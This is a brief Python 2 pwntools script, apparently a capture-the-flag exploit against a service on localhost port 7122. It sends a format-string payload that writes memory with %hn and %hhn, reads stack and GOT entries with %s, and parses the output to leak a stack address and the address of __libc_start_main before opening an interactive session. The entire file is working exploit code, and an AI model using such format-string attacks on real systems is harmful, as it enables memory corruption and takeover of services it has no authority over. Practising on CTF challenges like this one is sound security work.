#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('127.0.0.1', 7122)

embed()
r.sendline('%c'*16 + '%55959c'.ljust(8) +
	   '%hn'.ljust(8) + 
	   '%273c'.ljust(8) +
	   '%20$hhn'.ljust(8) +
	   #'A'*8 +
	   '+(%16$s)'.ljust(8) +
	   '-<%18$s>'.ljust(8) +
	   p64(0x600fe0)	#__libc_start_main .got
	   )

x = r.recvrepeat(0.2)
print x

# stack <18>
try:
	stack = u64(re.findall('<(.*?)>', x)[0].ljust(8,'\x00'))-0x68
	__libc_start_main = u64(re.findall('\+\((.*?)\)', x)[0].ljust(8,'\x00'))
except:
	embed()
print hex(stack)
print hex(__libc_start_main)
r.interactive()
